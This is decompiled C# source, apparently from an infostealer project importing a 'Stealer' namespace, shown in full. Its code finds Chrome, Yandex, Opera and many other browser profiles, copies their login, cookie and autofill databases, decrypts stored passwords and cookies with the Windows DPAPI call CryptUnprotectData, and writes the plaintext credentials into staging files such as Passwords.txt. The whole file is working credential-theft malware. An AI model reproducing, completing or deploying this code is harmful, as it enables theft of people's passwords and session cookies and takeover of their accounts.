using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Stealer;

// Token: 0x02000004 RID: 4
internal class Class2
{
	// Token: 0x06000003 RID: 3 RVA: 0x000023F8 File Offset: 0x000005F8
	public static void smethod_0(string string_0)
	{
		Directory.CreateDirectory(string_0);
		try
		{
			Class2.smethod_5();
		}
		catch
		{
		}
		Class2.smethod_2();
		string str = "";
		List<Class8> list = Class2.smethod_3();
		foreach (Class8 @class in list)
		{
			str += @class.ToString();
		}
		File.WriteAllText(string_0 + "\\AutoFill.txt", str + "\n――――――――――――――――――――――――――――――――――――――――――――");
		str = "";
		Class10.string_1 = list.Count.ToString();
	}

	// Token: 0x06000004 RID: 4
	[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref Class2.Struct1 struct1_0, ref string string_0, ref Class2.Struct1 struct1_1, IntPtr intptr_0, ref Class2.Struct0 struct0_0, int int_0, ref Class2.Struct1 struct1_2);

	// Token: 0x06000005 RID: 5 RVA: 0x000024B0 File Offset: 0x000006B0
	private static byte[] smethod_1(byte[] byte_0, byte[] byte_1 = null)
	{
		Class2.Struct1 @struct = default(Class2.Struct1);
		Class2.Struct1 struct2 = default(Class2.Struct1);
		Class2.Struct1 struct3 = default(Class2.Struct1);
		Class2.Struct0 struct4 = new Class2.Struct0
		{
			int_0 = Marshal.SizeOf(typeof(Class2.Struct0)),
			int_1 = 0,
			intptr_0 = IntPtr.Zero,
			string_0 = null
		};
		string empty = string.Empty;
		try
		{
			try
			{
				if (byte_0 == null)
				{
					byte_0 = new byte[0];
				}
				struct2.intptr_0 = Marshal.AllocHGlobal(byte_0.Length);
				struct2.int_0 = byte_0.Length;
				Marshal.Copy(byte_0, 0, struct2.intptr_0, byte_0.Length);
			}
			catch (Exception)
			{
			}
			try
			{
				if (byte_1 == null)
				{
					byte_1 = new byte[0];
				}
				struct3.intptr_0 = Marshal.AllocHGlobal(byte_1.Length);
				struct3.int_0 = byte_1.Length;
				Marshal.Copy(byte_1, 0, struct3.intptr_0, byte_1.Length);
			}
			catch (Exception)
			{
			}
			Class2.CryptUnprotectData(ref struct2, ref empty, ref struct3, IntPtr.Zero, ref struct4, 1, ref @struct);
			byte[] array = new byte[@struct.int_0];
			Marshal.Copy(@struct.intptr_0, array, 0, @struct.int_0);
			return array;
		}
		catch (Exception)
		{
		}
		finally
		{
			if (@struct.intptr_0 != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(@struct.intptr_0);
			}
			if (struct2.intptr_0 != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(struct2.intptr_0);
			}
			if (struct3.intptr_0 != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(struct3.intptr_0);
			}
		}
		return new byte[0];
	}

	// Token: 0x06000006 RID: 6 RVA: 0x0000266C File Offset: 0x0000086C
	private static List<Class3> wcytTtnb2(string string_0)
	{
		List<Class3> result;
		if (!File.Exists(string_0))
		{
			result = null;
		}
		else
		{
			try
			{
				string text = Path.GetTempPath() + "/" + Class6.smethod_2() + ".fv";
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				File.Copy(string_0, text, true);
				Class7 @class = new Class7(text);
				List<Class3> list = new List<Class3>();
				@class.method_6("cookies");
				for (int i = 0; i < @class.method_2(); i++)
				{
					try
					{
						string text2 = string.Empty;
						try
						{
							text2 = Encoding.UTF8.GetString(Class2.smethod_1(Encoding.Default.GetBytes(@class.method_3(i, 12)), null));
						}
						catch (Exception)
						{
						}
						if (text2 != "")
						{
							Class3 class2 = new Class3();
							class2.method_3(@class.method_3(i, 1));
							class2.method_5(@class.method_3(i, 2));
							class2.method_7(@class.method_3(i, 4));
							class2.method_1(@class.method_3(i, 5));
							class2.method_9(@class.method_3(i, 6));
							class2.method_11(text2);
							Class3 item = class2;
							list.Add(item);
						}
					}
					catch (Exception)
					{
					}
				}
				File.Delete(text);
				result = list;
			}
			catch (Exception)
			{
				result = null;
			}
		}
		return result;
	}

	// Token: 0x06000007 RID: 7 RVA: 0x000027FC File Offset: 0x000009FC
	private static void smethod_2()
	{
		StreamWriter streamWriter = new StreamWriter("C:\\ProgramData\\debug.txt", true);
		Directory.CreateDirectory(Program.path + "\\Browsers\\Cookies");
		new List<Class3>();
		File.WriteAllText(Program.path + "\\Browsers\\CookiesList.txt", "");
		string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
		string[] array = new string[]
		{
			environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Cookies",
			environmentVariable + "\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies",
			environmentVariable + "\\Kometa\\User Data\\Default\\Cookies",
			environmentVariable + "\\Orbitum\\User Data\\Default\\Cookies",
			environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Cookies",
			environmentVariable + "\\Amigo\\User\\User Data\\Default\\Cookies",
			environmentVariable + "\\Torch\\User Data\\Default\\Cookies"
		};
		streamWriter.WriteLine("[Browsers Cookies] Get paths");
		for (int i = 0; i < array.Length; i++)
		{
			streamWriter.WriteLine("[Browsers Cookies] " + array[i]);
			List<Class3> list = Class2.wcytTtnb2(array[i]);
			if (list != null)
			{
				try
				{
					string text = null;
					foreach (Class3 @class in list)
					{
						text += @class.ToString();
					}
					File.WriteAllText(Program.path + string.Format("\\Browsers\\Cookies\\Cookies_{0}.txt", i), text);
					using (StreamWriter streamWriter2 = new StreamWriter(Program.path + "\\Browsers\\CookiesList.txt", true, Encoding.Default))
					{
						streamWriter2.WriteLine(array[i] + string.Format(" - Cookies_{0}.txt - Count: {1}", i, list.Count));
					}
					Class10.VadjZxyuNw = ((long)((ulong)uint.Parse(Class10.VadjZxyuNw) + (ulong)((long)list.Count))).ToString();
				}
				catch (Exception value)
				{
					Console.Write(value);
					Console.Read();
				}
			}
		}
		streamWriter.WriteLine("[Browsers Cookies] All ok (exit)");
		streamWriter.Close();
	}

	// Token: 0x06000008 RID: 8 RVA: 0x00002A40 File Offset: 0x00000C40
	private static List<Class8> smethod_3()
	{
		List<Class8> list = new List<Class8>();
		List<string> list2 = new List<string>();
		List<string> list3 = new List<string>
		{
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
			Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
		};
		List<string> list4 = new List<string>();
		foreach (string path in list3)
		{
			try
			{
				list4.AddRange(Directory.EnumerateDirectories(path));
			}
			catch
			{
			}
		}
		foreach (string path2 in list4)
		{
			try
			{
				list2.AddRange(Directory.EnumerateFiles(path2, "Login Data", SearchOption.AllDirectories));
				list2.AddRange(Directory.EnumerateFiles(path2, "Web Data", SearchOption.AllDirectories));
			}
			catch
			{
			}
		}
		string[] array = list2.ToArray();
		for (int i = 0; i < array.Length; i++)
		{
			List<Class8> list5 = Class2.smethod_4(array[i]);
			if (list5 != null)
			{
				list.AddRange(list5);
			}
		}
		return list;
	}

	// Token: 0x06000009 RID: 9 RVA: 0x00002B88 File Offset: 0x00000D88
	private static List<Class8> smethod_4(string string_0)
	{
		List<Class8> result;
		try
		{
			string text = Path.GetTempPath() + "/" + Class6.smethod_2() + ".fv";
			if (File.Exists(text))
			{
				File.Delete(text);
			}
			File.Copy(string_0, text, true);
			Class7 @class = new Class7(text);
			List<Class8> list = new List<Class8>();
			@class.method_6("autofill");
			if (@class.method_2() == 65536)
			{
				result = null;
			}
			else
			{
				for (int i = 0; i < @class.method_2(); i++)
				{
					try
					{
						Class8 class2 = new Class8();
						class2.Name = @class.method_3(i, 0);
						class2.method_1(@class.method_3(i, 1));
						Class8 item = class2;
						list.Add(item);
					}
					catch (Exception)
					{
					}
				}
				File.Delete(text);
				result = list;
			}
		}
		catch (Exception)
		{
			result = null;
		}
		return result;
	}

	// Token: 0x0600000A RID: 10 RVA: 0x00002C6C File Offset: 0x00000E6C
	private static void smethod_5()
	{
		StreamWriter streamWriter = new StreamWriter("C:\\ProgramData\\debug.txt", true);
		try
		{
			Directory.CreateDirectory(Program.path + "\\Browsers");
			List<LogPassData> list = new List<LogPassData>();
			List<string> list2 = new List<string>();
			List<string> list3 = new List<string>
			{
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
			};
			List<string> list4 = new List<string>();
			foreach (string path in list3)
			{
				try
				{
					list4.AddRange(Directory.EnumerateDirectories(path));
				}
				catch
				{
				}
			}
			foreach (string path2 in list4)
			{
				try
				{
					list2.AddRange(Directory.GetFiles(path2, "Login Data", SearchOption.AllDirectories));
					string[] files = Directory.GetFiles(path2, "Login Data", SearchOption.AllDirectories);
					foreach (string text in files)
					{
						streamWriter.WriteLine("+" + text);
						streamWriter.WriteLine("[Browsers] " + text);
						try
						{
							if (File.Exists(text))
							{
								string text2 = "Unknown (" + text + ")";
								if (text.Contains("Chrome"))
								{
									text2 = "Google Chrome";
								}
								if (text.Contains("Yandex"))
								{
									text2 = "Yandex Browser";
								}
								if (text.Contains("Orbitum"))
								{
									text2 = "Orbitum Browser";
								}
								if (text.Contains("Opera"))
								{
									text2 = "Opera Browser";
								}
								if (text.Contains("Amigo"))
								{
									text2 = "Amigo Browser";
								}
								if (text.Contains("Torch"))
								{
									text2 = "Torch Browser";
								}
								if (text.Contains("Comodo"))
								{
									text2 = "Comodo Browser";
								}
								if (text.Contains("CentBrowser"))
								{
									text2 = "CentBrowser";
								}
								if (text.Contains("Go!"))
								{
									text2 = "Go!";
								}
								if (text.Contains("uCozMedia"))
								{
									text2 = "uCozMedia";
								}
								if (text.Contains("Rockmelt"))
								{
									text2 = "Rockmelt";
								}
								if (text.Contains("Sleipnir"))
								{
									text2 = "Sleipnir";
								}
								if (text.Contains("SRWare Iron"))
								{
									text2 = "SRWare Iron";
								}
								if (text.Contains("Vivaldi"))
								{
									text2 = "Vivaldi";
								}
								if (text.Contains("Sputnik"))
								{
									text2 = "Sputnik";
								}
								if (text.Contains("Maxthon"))
								{
									text2 = "Maxthon";
								}
								if (text.Contains("AcWebBrowser"))
								{
									text2 = "AcWebBrowser";
								}
								if (text.Contains("Epic Browser"))
								{
									text2 = "Epic Browser";
								}
								if (text.Contains("MapleStudio"))
								{
									text2 = "MapleStudio";
								}
								if (text.Contains("BlackHawk"))
								{
									text2 = "BlackHawk";
								}
								if (text.Contains("Flock"))
								{
									text2 = "Flock";
								}
								if (text.Contains("CoolNovo"))
								{
									text2 = "CoolNovo";
								}
								if (text.Contains("Baidu Spark"))
								{
									text2 = "Baidu Spark";
								}
								if (text.Contains("Titan Browser"))
								{
									text2 = "Titan Browser";
								}
								try
								{
									streamWriter.WriteLine("[Browsers] Try get " + text2 + " / " + text);
									string text3 = Path.GetTempPath() + "/" + Class6.smethod_2() + ".fv";
									if (File.Exists(text3))
									{
										File.Delete(text3);
									}
									File.Copy(text, text3, true);
									Class7 @class = new Class7(text3);
									if (!@class.method_6("logins"))
									{
										break;
									}
									int num = 0;
									for (;;)
									{
										try
										{
											if (num >= @class.method_2())
											{
												break;
											}
											try
											{
												string text4 = string.Empty;
												try
												{
													text4 = Encoding.UTF8.GetString(Class2.smethod_1(Encoding.Default.GetBytes(@class.method_3(num, 5)), null));
												}
												catch (Exception)
												{
												}
												if (text4 != "")
												{
													LogPassData item = new LogPassData
													{
														Url = @class.method_3(num, 1).Replace("https://", "").Replace("http://", ""),
														Login = @class.method_3(num, 3),
														Password = text4,
														Program = text2
													};
													list.Add(item);
													streamWriter.WriteLine("[Browsers] Added to passwords / " + text2);
												}
											}
											catch (Exception)
											{
											}
											num++;
										}
										catch
										{
										}
									}
									File.Delete(text3);
								}
								catch
								{
								}
							}
						}
						catch (Exception ex)
						{
							streamWriter.WriteLine("ERROR / " + text + " / - " + ex.ToString());
						}
					}
				}
				catch
				{
				}
			}
			Environment.GetEnvironmentVariable("LocalAppData");
			string text5 = "";
			streamWriter.WriteLine("[Browsers] Domain detect");
			foreach (LogPassData logPassData in list)
			{
				text5 += logPassData.ToString();
				try
				{
					string text6 = logPassData.Url.Contains("/") ? logPassData.Url.Split(new char[]
					{
						'/'
					})[0] : logPassData.Url;
					if (!Class10.string_9.Contains(text6))
					{
						Class10.string_9 = Class10.string_9 + text6 + ";";
					}
				}
				catch (Exception value)
				{
					Console.Write(value);
				}
			}
			File.WriteAllText(Program.path + "\\Browsers\\Passwords.txt", (text5 != null) ? (text5 + "\n――――――――――――――――――――――――――――――――――――――――――――") : "");
			streamWriter.WriteLine("[Browsers] Writed to file...");
			Class10.string_0 = list.Count.ToString();
			streamWriter.WriteLine("[Browsers] Counters (exit)");
		}
		catch (Exception ex2)
		{
			streamWriter.WriteLine(ex2.ToString());
		}
		streamWriter.Close();
	}

	// Token: 0x0600000B RID: 11 RVA: 0x0000224C File Offset: 0x0000044C
	public Class2()
	{
		Class13.Cyiv2R6zubiV2();
		base..ctor();
	}

	// Token: 0x02000005 RID: 5
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct Struct0
	{
		// Token: 0x04000001 RID: 1
		public int int_0;

		// Token: 0x04000002 RID: 2
		public int int_1;

		// Token: 0x04000003 RID: 3
		public IntPtr intptr_0;

		// Token: 0x04000004 RID: 4
		public string string_0;
	}

	// Token: 0x02000006 RID: 6
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct Struct1
	{
		// Token: 0x04000005 RID: 5
		public int int_0;

		// Token: 0x04000006 RID: 6
		public IntPtr intptr_0;
	}
}
